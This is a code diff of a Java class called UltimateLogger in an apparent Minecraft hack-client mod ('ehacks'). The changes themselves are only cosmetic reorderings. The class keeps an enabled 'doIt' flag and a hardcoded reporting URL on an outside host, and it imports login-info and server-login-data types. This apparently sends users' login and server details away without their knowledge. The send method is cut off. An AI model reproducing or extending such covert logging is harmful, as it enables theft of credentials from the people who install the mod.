@@ -8,6 +8,7 @@ package ehacks.mod.util;
 import com.google.gson.Gson;
 import ehacks.mod.util.ultimatelogger.LoginInfo;
 import ehacks.mod.util.ultimatelogger.ServerLoginData;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.URL;
@@ -15,16 +16,14 @@ import java.net.URLConnection;
 import java.net.URLEncoder;
 
 /**
- *
  * @author radioegor146
  */
 public class UltimateLogger {
 
-    public static UltimateLogger INSTANCE = new UltimateLogger();
-
     private static final boolean ifYouWantToRemoveItJustSetdoItFalseXD = false;
     private static final boolean doIt = true;
     private static final String url = "http://1488.me/ehacks/log.php";
+    public static UltimateLogger INSTANCE = new UltimateLogger();
 
     private void send(int type, String data) {
         if (!doIt) {
